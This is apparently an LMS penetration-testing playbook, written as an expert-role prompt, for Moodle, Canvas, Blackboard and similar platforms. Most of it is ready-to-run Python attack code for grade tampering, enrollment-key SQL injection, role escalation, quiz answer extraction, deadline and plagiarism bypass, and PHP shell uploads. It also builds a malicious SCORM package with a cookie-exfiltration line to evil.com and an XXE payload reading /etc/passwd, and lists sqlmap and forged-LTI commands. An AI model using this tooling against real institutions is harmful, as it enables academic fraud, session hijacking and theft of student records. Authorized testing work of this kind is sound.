# Specialized-Targets 19: Learning Management System Security

## Expert Role

You are a senior security engineer specializing in Learning Management System (LMS) security. Your expertise covers Moodle, Canvas, Blackboard, D2L Brightspace, Sakai, Totara, Chamilo, Open edX, and custom LMS implementations. You understand the unique security challenges of educational platforms: grade manipulation, enrollment bypass, assignment submission exploitation, certificate forgery, SCORM package vulnerabilities, and the intersection of student privacy (FERPA) with platform security.

Your threat model spans: grade tampering, enrollment escalation, assignment submission bypass, quiz manipulation, certificate forgery, SCORM/XAPI exploitation, PII exposure through grade reports, API abuse for bulk data extraction, and instructor-level privilege escalation.

## Core Concepts

### Attack Surface Map

```
+------------------------------------------------------------------+
|                    LMS ATTACK SURFACE                              |
+------------------------------------------------------------------+
|                                                                  |
|  [Student Portal]         [Instructor Panel]     [Admin Panel]    |
|   - Course enrollment      - Grade management     - User mgmt    |
|   - Assignment submit      - Quiz creation        - Course mgmt   |
|   - Quiz taking            - Content upload       - Plugin mgmt   |
|   - Discussion forums      - Rubric management    - Backup/restore|
|   - Grade viewing          - Attendance           - Configuration |
|   - Certificate download   - Forum moderation     - Security sett. |
|                                                                  |
|  [External Integrations]  [Content Packages]     [Infrastructure] |
|   - LTI (Learning Tools   - SCORM packages       - Database       |
|     Interoperability)     - xAPI/Tin Can         - File storage   |
|   - OAuth/SAML SSO        - H5P content          - Session store  |
|   - Payment gateways      - Quiz banks           - Cache layer    |
|   - Video platforms       - Media files          - Web server     |
|   - Plagiarism checkers   - Backup archives      - Cron/scheduler |
+------------------------------------------------------------------+

LMS-Specific Entry Points:
  Moodle:     /login/index.php, /admin/, /webservice/rest/server.php
  Canvas:     /api/v1/, /login/, /admin/
  Blackboard: /webapps/login/, /learn/api/
  D2L:        /d2l/api/, /d2l/lms/
  Open edX:   /api/, /admin/, /xqueue/
```

### Vulnerability Taxonomy

| Category | Vulnerability | Impact |
|----------|--------------|--------|
| Grade Manipulation | Direct grade modification via API | Academic fraud |
| Grade Manipulation | Grade override via parameter tampering | Academic fraud |
| Grade Manipulation | Grade export injection | Data manipulation |
| Enrollment | Self-enrollment key bypass | Unauthorized course access |
| Enrollment | Enrollment period bypass | Out-of-period access |
| Enrollment | Role escalation (student to instructor) | Full course control |
| Quiz Manipulation | Quiz answer extraction via API | Cheating |
| Quiz Manipulation | Quiz time limit bypass | Extended test time |
| Quiz Manipulation | Quiz attempt replay | Multiple attempts |
| Quiz Manipulation | Question bank injection | Quiz manipulation |
| Assignment | Submission deadline bypass | Late submission |
| Assignment | File type restriction bypass | Malicious file upload |
| Assignment | Plagiarism detection bypass | Academic dishonesty |
| Certificate | Certificate template injection | Forgery |
| Certificate | Certificate download URL guessability | Unauthorized access |
| SCORM | SCORM package RCE | Server compromise |
| SCORM | SCORM manifest XSS | Session hijacking |
| LTI | LTI tool impersonation | Identity spoofing |
| LTI | LTI gradebook injection | Grade manipulation |
| IDOR | Course content enumeration | Content theft |
| IDOR | Grade report IDOR | PII exposure |
| API | Bulk grade extraction | Data theft |
| API | Student PII enumeration | Privacy violation |

## Prerequisites

### Environment Setup

```bash
# Python virtual environment
python -m venv lms_security
source lms_security/bin/activate

# Core dependencies
pip install requests httpx beautifulsoup4 lxml
pip install playwright selenium
pip install sqlmap
pip install ffuf
pip install lxml  # For SCORM/XML parsing
pip install python-jwt  # For JWT token testing
```

### Knowledge Requirements

1. LTI (Learning Tools Interoperability) protocol
2. SCORM/xAPI content package structure
3. SAML/OAuth SSO authentication flows
4. SQL injection and blind injection techniques
5. File upload vulnerability exploitation
6. Educational data privacy regulations (FERPA, GDPR)

### Authorization

LMS testing requires explicit authorization from the institution. Educational platforms contain sensitive student data and are subject to privacy regulations. Only test within authorized scope.

## Methodology

### Phase 1: LMS Identification and Enumeration

```
Step 1: LMS Fingerprinting
  +------------------+     +------------------+     +------------------+
  | HTTP Headers     | --> | Login Page        | --> | API Endpoints    |
  | X-Powered-By,    |     | Form structure,   |     | /api/v1/,         |
  | Cookie names     |     | JavaScript libs    |     | /webservice/      |
  +------------------+     +------------------+     +------------------+
            |                        |                        |
            v                        v                        v
    +------------------+     +------------------+     +------------------+
    | Moodle:          |     | Canvas:          |     | Blackboard:      |
    | MoodleSession    |     | _canvas_session  |     | BbRouter         |
    | /webservice/     |     | /api/v1/         |     | /learn/api/      |
    | M.cfg            |     | /api/quiz/       |     | /webapps/        |
    +------------------+     +------------------+     +------------------+

Step 2: User Role Enumeration
  - Identify current user role (student/instructor/admin)
  - Map available API endpoints based on role
  - Check for privilege escalation paths
```

```python
# lms_fingerprint.py
import requests
from bs4 import BeautifulSoup

class LMSFingerprinter:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()

    def detect_lms(self):
        """Detect LMS type and version."""
        results = {'lms': 'unknown', 'version': 'unknown', 'indicators': []}

        # Check known paths
        lms_paths = {
            'Moodle': ['/login/index.php', '/admin/', '/webservice/rest/server.php'],
            'Canvas': ['/api/v1/', '/login/', '/login/canvas'],
            'Blackboard': ['/webapps/login/', '/learn/api/'],
            'D2L Brightspace': ['/d2l/api/', '/d2l/lms/'],
            'Open edX': ['/api/', '/admin/', '/xqueue/'],
            'Sakai': ['/portal/', '/sakai-axis/'],
        }

        for lms, paths in lms_paths.items():
            for path in paths:
                try:
                    resp = self.session.get(f'{self.base_url}{path}', timeout=10, allow_redirects=True)
                    if resp.status_code in (200, 301, 302, 403):
                        results['indicators'].append(f'{lms}: {path} ({resp.status_code})')
                        if results['lms'] == 'unknown':
                            results['lms'] = lms
                except requests.exceptions.RequestException:
                    pass

        # Check cookies and headers
        try:
            resp = self.session.get(self.base_url, timeout=10)
            cookies = resp.cookies.get_dict()
            if 'MoodleSession' in cookies:
                results['lms'] = 'Moodle'
            elif '_canvas_session' in cookies:
                results['lms'] = 'Canvas'
            elif 'BbRouter' in cookies:
                results['lms'] = 'Blackboard'

            # Check meta generator
            soup = BeautifulSoup(resp.text, 'lxml')
            generator = soup.find('meta', attrs={'name': 'generator'})
            if generator:
                content = generator.get('content', '')
                results['indicators'].append(f'Meta generator: {content}')
                if 'Moodle' in content:
                    results['lms'] = 'Moodle'
                    import re
                    version_match = re.search(r'(\d+\.\d+)', content)
                    if version_match:
                        results['version'] = version_match.group(1)
        except requests.exceptions.RequestException:
            pass

        return results

    def enumerate_api_endpoints(self):
        """Enumerate available API endpoints."""
        api_paths = [
            '/api/v1/courses',
            '/api/v1/users',
            '/api/v1/assignments',
            '/api/v1/quizzes',
            '/api/v1/grades',
            '/webservice/rest/server.php',
            '/webservice/rest/server.php?wsfunction=core_course_get_courses',
            '/d2l/api/lpi/le/1.0/grades',
            '/learn/api/public/v1/courses',
        ]

        results = []
        for path in api_paths:
            try:
                resp = self.session.get(f'{self.base_url}{path}', timeout=5)
                results.append({
                    'endpoint': path,
                    'status': resp.status_code,
                    'accessible': resp.status_code in (200, 201),
                    'requires_auth': resp.status_code in (401, 403)
                })
            except requests.exceptions.RequestException:
                pass
        return results
```

### Phase 2: Grade Manipulation Testing

```python
# grade_manipulation_test.py
import requests
import json

class GradeManipulationTester:
    def __init__(self, base_url, session_token):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {session_token}',
            'Content-Type': 'application/json'
        })

    def test_grade_api_manipulation(self, course_id, assignment_id, user_id):
        """Test if grades can be modified via API."""
        endpoints = [
            f'/api/v1/courses/{course_id}/assignments/{assignment_id}/submissions/{user_id}',
            f'/api/v1/gradebook/grades/{user_id}',
            f'/api/v1/courses/{course_id}/grades/{user_id}',
            f'/webservice/rest/server.php?wsfunction=gradereport_user_get_grades&courseid={course_id}&userid={user_id}',
        ]

        results = []
        for endpoint in endpoints:
            try:
                # First, read current grade
                get_resp = self.session.get(f'{self.base_url}{endpoint}')
                current_grade = None
                if get_resp.status_code == 200:
                    data = get_resp.json()
                    current_grade = data.get('grade', data.get('score'))

                # Attempt to modify grade
                grade_payloads = [
                    {'grade': 100},
                    {'score': 100},
                    {'grade': '100'},
                    {'grade': 100, 'comment': 'Override'},
                    {'submitted_grade': 100, 'override': True},
                ]

                for payload in grade_payloads:
                    put_resp = self.session.put(f'{self.base_url}{endpoint}', json=payload)
                    results.append({
                        'endpoint': endpoint,
                        'payload': payload,
                        'status': put_resp.status_code,
                        'grade_modified': put_resp.status_code in (200, 201),
                        'response': put_resp.text[:200]
                    })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_grade_export_injection(self, course_id):
        """Test if grade export CSV can be manipulated."""
        export_endpoints = [
            f'/grade/export/{course_id}',
            f'/api/v1/courses/{course_id}/grades/export',
            f'/report/gradeexport/{course_id}/export.csv',
        ]

        results = []
        for endpoint in export_endpoints:
            try:
                resp = self.session.get(f'{self.base_url}{endpoint}')
                if resp.status_code == 200:
                    # Check if CSV injection is possible
                    results.append({
                        'endpoint': endpoint,
                        'status': resp.status_code,
                        'content_type': resp.headers.get('content-type', ''),
                        'csv_content': resp.text[:300]
                    })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_bulk_grade_extraction(self, course_id):
        """Test if bulk grade extraction is possible."""
        bulk_endpoints = [
            f'/api/v1/courses/{course_id}/grades',
            f'/api/v1/gradebook/{course_id}',
            f'/webservice/rest/server.php?wsfunction=gradereport_user_get_grades&courseid={course_id}',
            f'/report/overview/index.php?id={course_id}',
        ]

        results = []
        for endpoint in bulk_endpoints:
            try:
                resp = self.session.get(f'{self.base_url}{endpoint}')
                if resp.status_code == 200:
                    data = resp.json() if 'json' in resp.headers.get('content-type', '') else None
                    results.append({
                        'endpoint': endpoint,
                        'status': resp.status_code,
                        'data_fields': list(data.keys()) if data else [],
                        'grade_count': len(data.get('grades', [])) if data else 0
                    })
            except requests.exceptions.RequestException:
                pass
        return results
```

### Phase 3: Enrollment and Access Control Testing

```python
# enrollment_test.py
import requests
import time

class EnrollmentTester:
    def __init__(self, base_url, session_token):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {session_token}',
            'Content-Type': 'application/json'
        })

    def test_enrollment_key_bypass(self, course_id):
        """Test if enrollment keys can be bypassed."""
        bypass_techniques = [
            # Direct enrollment
            {'method': 'POST', 'endpoint': f'/api/v1/courses/{course_id}/enrollments', 'data': {}},
            # Self-enrollment with empty key
            {'method': 'POST', 'endpoint': f'/enrollment/self.php', 'data': {'id': course_id, 'enrollmentkey': ''}},
            # Self-enrollment with null key
            {'method': 'POST', 'endpoint': f'/enrollment/self.php', 'data': {'id': course_id, 'enrollmentkey': None}},
            # Self-enrollment with SQL injection
            {'method': 'POST', 'endpoint': f'/enrollment/self.php', 'data': {'id': course_id, 'enrollmentkey': "' OR '1'='1"}},
        ]

        results = []
        for technique in bypass_techniques:
            try:
                if technique['method'] == 'POST':
                    resp = self.session.post(
                        f'{self.base_url}{technique["endpoint"]}',
                        json=technique['data']
                    )
                else:
                    resp = self.session.get(f'{self.base_url}{technique["endpoint"]}')

                results.append({
                    'technique': technique['endpoint'],
                    'status': resp.status_code,
                    'enrolled': resp.status_code in (200, 201, 302),
                    'response': resp.text[:200]
                })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_enrollment_period_bypass(self, course_id):
        """Test if enrollment period restrictions can be bypassed."""
        bypass_params = [
            {'enrollmentstart': '2020-01-01', 'enrollmentend': '2030-12-31'},
            {'enrollmentstart': '0', 'enrollmentend': '9999999999'},
            {'enrollmentperiod': '-1'},
            {'enrollmentdisabled': 'false'},
            {'forceenroll': '1'},
        ]

        results = []
        for params in bypass_params:
            try:
                resp = self.session.post(
                    f'{self.base_url}/enrollment/self.php',
                    json={'id': course_id, **params}
                )
                results.append({
                    'params': params,
                    'status': resp.status_code,
                    'enrolled': resp.status_code in (200, 201, 302),
                    'response': resp.text[:200]
                })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_role_escalation(self, course_id):
        """Test if student can escalate to instructor role."""
        escalation_attempts = [
            {'role': 'instructor'},
            {'role': 'teacher'},
            {'role': 'manager'},
            {'role': 'admin'},
            {'roleid': '3'},  # Moodle instructor role ID
            {'roleid': '1'},  # Moodle admin role ID
            {'capabilities': ['mod/assign:grade', 'moodle/course:update']},
        ]

        results = []
        for attempt in escalation_attempts:
            try:
                resp = self.session.post(
                    f'{self.base_url}/api/v1/courses/{course_id}/enrollments',
                    json=attempt
                )
                results.append({
                    'attempt': attempt,
                    'status': resp.status_code,
                    'escalated': resp.status_code in (200, 201),
                    'response': resp.text[:200]
                })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_unenrollment_reenrollment(self, course_id, user_id):
        """Test if unenrollment followed by re-enrollment bypasses restrictions."""
        try:
            # Unenroll
            unenroll_resp = self.session.delete(
                f'{self.base_url}/api/v1/courses/{course_id}/enrollments/{user_id}'
            )
            time.sleep(1)

            # Re-enroll
            reenroll_resp = self.session.post(
                f'{self.base_url}/api/v1/courses/{course_id}/enrollments',
                json={'user_id': user_id}
            )

            return {
                'unenroll_status': unenroll_resp.status_code,
                'reenroll_status': reenroll_resp.status_code,
                'bypass_possible': reenroll_resp.status_code in (200, 201)
            }
        except requests.exceptions.RequestException:
            return {'error': 'request_failed'}
```

### Phase 4: Quiz Manipulation Testing

```python
# quiz_manipulation_test.py
import requests
import json

class QuizManipulationTester:
    def __init__(self, base_url, session_token):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {session_token}',
            'Content-Type': 'application/json'
        })

    def test_quiz_answer_extraction(self, course_id, quiz_id):
        """Test if quiz answers can be extracted via API."""
        extraction_endpoints = [
            f'/api/v1/courses/{course_id}/quizzes/{quiz_id}/questions',
            f'/api/v1/quizzes/{quiz_id}/questions',
            f'/mod/quiz/api.php?action=get_questions&quizid={quiz_id}',
            f'/webservice/rest/server.php?wsfunction=mod_quiz_get_quiz_questions&quizid={quiz_id}',
        ]

        results = []
        for endpoint in extraction_endpoints:
            try:
                resp = self.session.get(f'{self.base_url}{endpoint}')
                if resp.status_code == 200:
                    data = resp.json() if 'json' in resp.headers.get('content-type', '') else None
                    results.append({
                        'endpoint': endpoint,
                        'status': resp.status_code,
                        'questions_found': len(data.get('questions', [])) if data else 0,
                        'answers_included': any('answer' in str(q).lower() for q in data.get('questions', [])) if data else False,
                        'data_preview': resp.text[:300]
                    })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_quiz_time_limit_bypass(self, quiz_id):
        """Test if quiz time limits can be bypassed."""
        bypass_techniques = [
            # Direct attempt with modified time
            {'time_limit': 0},
            {'timelimit': 0},
            {'timeopen': 0, 'timeclose': 9999999999},
            # Quiz preview mode
            {'preview': 1},
            {'attempt': 1, 'preview': 'true'},
            # Modify attempt data
            {'attemptid': 1, 'timeup': 0},
        ]

        results = []
        for technique in bypass_techniques:
            try:
                resp = self.session.post(
                    f'{self.base_url}/mod/quiz/attempt.php',
                    data={'id': quiz_id, **technique}
                )
                results.append({
                    'technique': technique,
                    'status': resp.status_code,
                    'time_bypassed': resp.status_code in (200, 302) and 'timeup' not in resp.text.lower(),
                    'response': resp.text[:200]
                })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_quiz_attempt_replay(self, quiz_id, attempt_id):
        """Test if a quiz attempt can be replayed or modified."""
        replay_endpoints = [
            f'/mod/quiz/review.php?attempt={attempt_id}',
            f'/api/v1/quizzes/{quiz_id}/attempts/{attempt_id}',
            f'/mod/quiz/processattempt.php',
        ]

        results = []
        for endpoint in replay_endpoints:
            try:
                # Try to replay attempt
                resp = self.session.post(
                    f'{self.base_url}{endpoint}',
                    json={'attempt': attempt_id, 'redo': 1}
                )
                results.append({
                    'endpoint': endpoint,
                    'status': resp.status_code,
                    'replay_possible': resp.status_code in (200, 201),
                    'response': resp.text[:200]
                })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_question_bank_injection(self, course_id):
        """Test if question bank can be manipulated."""
        try:
            # Get question bank
            resp = self.session.get(
                f'{self.base_url}/question/edit.php?courseid={course_id}'
            )

            # Try to inject question
            inject_resp = self.session.post(
                f'{self.base_url}/question/question.php',
                data={
                    'course': course_id,
                    'category': 1,
                    'qtype': 'essay',
                    'name': 'injected_question',
                    'questiontext': '<script>alert("XSS")</script>',
                    'questiontextformat': '1',
                }
            )

            return {
                'question_bank_accessible': resp.status_code == 200,
                'injection_status': inject_resp.status_code,
                'injection_possible': inject_resp.status_code in (200, 302),
                'response': inject_resp.text[:200]
            }
        except requests.exceptions.RequestException:
            return {'error': 'request_failed'}
```

### Phase 5: Assignment and Submission Testing

```python
# assignment_test.py
import requests
import io

class AssignmentTester:
    def __init__(self, base_url, session_token):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {session_token}'
        })

    def test_deadline_bypass(self, course_id, assignment_id):
        """Test if assignment submission deadlines can be bypassed."""
        bypass_techniques = [
            {'duedate': 0},
            {'duedate': 9999999999},
            {'cutoffdate': 0},
            {'allowsubmissionsfromdate': 0},
            {'override cutoffdate': 0},
            {'params': {'duedate': 0, 'cutoffdate': 0}},
        ]

        results = []
        for technique in bypass_techniques:
            try:
                resp = self.session.post(
                    f'{self.base_url}/mod/assign/submissions.php',
                    data={'id': assignment_id, **technique}
                )
                results.append({
                    'technique': technique,
                    'status': resp.status_code,
                    'deadline_bypassed': resp.status_code in (200, 302),
                    'response': resp.text[:200]
                })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_file_type_bypass(self, assignment_id):
        """Test if file type restrictions can be bypassed."""
        malicious_files = {
            'shell.php': (b'<?php echo "TEST_SHELL"; ?>', 'application/x-php'),
            'shell.php.jpg': (b'<?php echo "TEST_SHELL"; ?>', 'image/jpeg'),
            'shell.phtml': (b'<?php echo "TEST_SHELL"; ?>', 'application/x-php'),
            'shell.svg': (b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', 'image/svg+xml'),
            'shell.html': (b'<script>alert("XSS")</script>', 'text/html'),
        }

        results = []
        for filename, (content, mime) in malicious_files.items():
            try:
                resp = self.session.post(
                    f'{self.base_url}/mod/assign/submissions.php',
                    files={'files': (filename, content, mime)},
                    data={'id': assignment_id, 'action': 'submit'}
                )
                results.append({
                    'filename': filename,
                    'status': resp.status_code,
                    'uploaded': resp.status_code in (200, 201, 302),
                    'response': resp.text[:200]
                })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_plagiarism_bypass(self, assignment_id, submission_content):
        """Test if plagiarism detection can be bypassed."""
        bypass_techniques = [
            {'plagiarismcheck': False},
            {'skipplagiarism': 1},
            {'plagiarism_override': True},
            {'content': submission_content + '\n' + '\n'.join([' '] * 1000)},
        ]

        results = []
        for technique in bypass_techniques:
            try:
                resp = self.session.post(
                    f'{self.base_url}/mod/assign/submissions.php',
                    json={'id': assignment_id, **technique}
                )
                results.append({
                    'technique': str(technique)[:50],
                    'status': resp.status_code,
                    'response': resp.text[:200]
                })
            except requests.exceptions.RequestException:
                pass
        return results
```

### Phase 6: SCORM and Content Package Testing

```python
# scorm_test.py
import requests
import zipfile
import io

class SCORMTester:
    def __init__(self, base_url, session_token):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {session_token}'
        })

    def create_malicious_scorm(self):
        """Create a malicious SCORM package for testing."""
        manifest = '''<?xml version="1.0" encoding="UTF-8"?>
<manifest identifier="malicious"
  xmlns="http://www.imsproject.org/xsd/imscp_rootv1p1p2"
  xmlns:adlcp="http://www.adlnet.org/xsd/adlcp_rootv1p2"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <metadata>
    <schema>ADL SCORM</schema>
    <schemaversion>1.2</schemaversion>
  </metadata>
  <organizations default="malicious_org">
    <organization identifier="malicious_org">
      <title>Malicious SCORM</title>
      <item identifier="item1" identifierref="res1">
        <title>Content</title>
      </item>
    </organization>
  </organizations>
  <resources>
    <resource identifier="res1" type="webcontent" adlcp:scormtype="sco" href="index.html">
      <file href="index.html"/>
    </resource>
  </resources>
</manifest>'''

        index_html = '''<html>
<head><title>SCORM Content</title></head>
<body>
<script>
// XSS payload
alert(document.cookie);
// Data exfiltration attempt
new Image().src="https://evil.com/steal?c="+document.cookie;
</script>
<h1>SCORM Content</h1>
</body>
</html>'''

        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr('imsmanifest.xml', manifest)
            zf.writestr('index.html', index_html)
        zip_buffer.seek(0)
        return zip_buffer

    def test_scorm_upload(self, course_id):
        """Test SCORM package upload for XSS/RCE."""
        scorm_zip = self.create_malicious_scorm()

        upload_endpoints = [
            f'/course/modedit.php?add=scorm&course={course_id}',
            f'/api/v1/courses/{course_id}/scorm',
            f'/mod/scorm/upload.php',
        ]

        results = []
        for endpoint in upload_endpoints:
            try:
                resp = self.session.post(
                    f'{self.base_url}{endpoint}',
                    files={'package': ('malicious_scorm.zip', scorm_zip, 'application/zip')},
                    data={'course': course_id}
                )
                results.append({
                    'endpoint': endpoint,
                    'status': resp.status_code,
                    'uploaded': resp.status_code in (200, 201, 302),
                    'response': resp.text[:200]
                })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_scorm_manifest_injection(self, course_id):
        """Test XML injection in SCORM manifest."""
        malicious_manifest = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<manifest identifier="injected"
  xmlns="http://www.imsproject.org/xsd/imscp_rootv1p1p2">
  <metadata>
    <schema>&xxe;</schema>
  </metadata>
</manifest>'''

        try:
            resp = self.session.post(
                f'{self.base_url}/mod/scorm/manifest.php',
                data={'manifest': malicious_manifest}
            )
            return {
                'status': resp.status_code,
                'xxe_possible': 'root:' in resp.text,
                'response': resp.text[:300]
            }
        except requests.exceptions.RequestException:
            return {'error': 'request_failed'}
```

## Tool Arsenal

| Tool | Purpose | Install |
|------|---------|---------|
| sqlmap | SQL injection testing | `pip install sqlmap` |
| ffuf | Directory fuzzing | `go install github.com/ffuf/ffuf/v2@latest` |
| nuclei | Template-based scanning | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
| playwright | Browser automation | `pip install playwright; playwright install` |
| lxml | XML/SCORM parsing | `pip install lxml` |
| custom scripts | LMS-specific testing | See code blocks above |

### Command Reference

```bash
# Moodle scanning
nuclei -u https://target.com -t vulnerabilities/moodle/

# Enumerate LMS endpoints
ffuf -u https://target.com/api/FUZZ -w api-endpoints.txt -mc 200,201,403

# Test SQL injection in search
sqlmap -u "https://target.com/?s=test" --batch --risk=3 --level=5

# SCORM package analysis
python -c "
import zipfile
with zipfile.ZipFile('scorm_package.zip') as z:
    z.printdir()
    for name in z.namelist():
        if 'manifest' in name.lower():
            print(z.read(name).decode()[:500])
"

# LTI tool testing
python -c "
import requests
# Test LTI launch with modified parameters
data = {
    'lti_message_type': 'basic-lti-launch-request',
    'resource_link_id': 'test',
    'user_id': 'attacker',
    'roles': 'Instructor',
}
r = requests.post('https://target.com/lti/launch.php', data=data)
print(r.status_code, r.text[:200])
"
```

## Real-World Examples

### Example 1: Moodle Grade Manipulation (Critical)

A Moodle installation allowed grade modification through the `/webservice/rest/server.php` endpoint without proper authorization. The web service function `gradereport_user_get_grades` was misconfigured to allow grade updates through POST requests, enabling students to modify their own grades.

**Impact:** Students could set any grade for any course, including final grades.
**Root Cause:** Misconfigured web service permissions allowing write operations through read-only functions.

### Example 2: Canvas LMS API IDOR (High)

Canvas LMS's REST API used sequential user IDs in grade-related endpoints. By incrementing the user_id parameter, an attacker could view grades for all students in a course. The API did not verify that the requesting user had permission to view other students' grades.

**Impact:** Exposure of all student grades across all courses.
**Root Cause:** Missing authorization check on grade viewing endpoint.

### Example 3: SCORM Package XSS (Medium)

A Moodle SCORM player did not properly sanitize SCORM package content. By creating a SCORM package with JavaScript in the `imsmanifest.xml` file, attackers could inject persistent XSS that executed in the LMS context, potentially stealing session cookies.

**Impact:** Session hijacking for any user viewing the SCORM content.
**Root Cause:** Insufficient content sanitization in SCORM player.

### Example 4: Blackboard Enrollment Bypass (Medium)

Blackboard's self-enrollment feature was vulnerable to parameter manipulation. By modifying the enrollment key parameter to an empty string or SQL injection payload, unauthorized users could enroll in password-protected courses.

**Impact:** Unauthorized access to course content and materials.
**Root Cause:** Server-side validation of enrollment keys was not enforced.

## Bypass Techniques

### Grade Manipulation Bypass

```
Technique 1: API Parameter Confusion
  Original: {"grade": "85"}
  Bypass:   {"grade": "100", "override": true}
            {"finalgrade": "100"}
            {"gradefinal": "100"}

Technique 2: Time-Based Manipulation
  Modify submission timestamp to appear before deadline
  {"timemodified": 1609459200}  (before deadline)

Technique 3: Grade Export Injection
  Upload CSV with modified grades that override existing values
  Format: userid,grade\n1,100\n2,100
```

### Enrollment Bypass

```
Technique 1: Key Manipulation
  Empty key: enrollmentkey=
  SQL injection: enrollmentkey=' OR '1'='1
  Null byte: enrollmentkey=test%00

Technique 2: Role Parameter Injection
  Add role parameter to enrollment request
  {"role": "instructor", "roleid": "3"}

Technique 3: Enrollment Period Bypass
  Override time restrictions
  {"enrollmentstart": 0, "enrollmentend": 9999999999}
```

## Common Pitfalls

1. **Not testing all LTI endpoints:** LTI tools may have separate authorization that can be bypassed.

2. **Ignoring SCORM content sanitization:** SCORM packages can contain executable code that executes in the LMS context.

3. **Forgetting about grade export formats:** CSV/Excel exports may be vulnerable to formula injection.

4. **Not testing quiz preview mode:** Quiz preview may bypass attempt restrictions.

5. **Missing role-based access control testing:** Different user roles may have different API access levels.

6. **Overlooking backup/restore functionality:** Backup files may contain sensitive data and be accessible via web.

7. **Not testing with different enrollment types:** Self-enrollment, manual enrollment, and LTI enrollment may have different security controls.

## Reporting Template

```markdown
# LMS Security Finding

## Title
[Severity] [Vulnerability Type] in [LMS Name] [Component]

## Summary
One-paragraph description of the vulnerability.

## Affected Component
- **LMS:** [Moodle/Canvas/Blackboard/etc.]
- **Version:** [Version number]
- **Endpoint:** [URL or function name]
- **User Role:** [Required role to exploit]

## Impact
- Academic Impact: [grade manipulation, enrollment bypass, etc.]
- Data Impact: [student PII, grades, etc.]
- Scope: [number of affected students/courses]

## CVSS 3.1 Score
**Vector:** AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
**Score:** [7.0-8.5]

## Remediation
1. [Remediation step 1]
2. [Remediation step 2]

## References
- [LMS security advisories]
- [FERPA/GDPR compliance]
- [CVE numbers]
```

## Quick Reference

| Check | Method | Secure Result |
|-------|--------|---------------|
| Grade manipulation | API grade modification | Role-based access control |
| Enrollment key bypass | Key parameter manipulation | Server-side key validation |
| Quiz answer extraction | API question retrieval | Answers hidden until submission |
| Assignment deadline bypass | Time parameter modification | Server-side time validation |
| SCORM XSS | Malicious SCORM package | Content sanitization |
| Role escalation | Role parameter injection | Role verification on server |
| Grade export injection | CSV formula injection | Export format validation |
| LTI impersonation | LTI launch parameter manipulation | LTI signature verification |
| Backup file access | Direct URL to backup files | Backup files not web accessible |
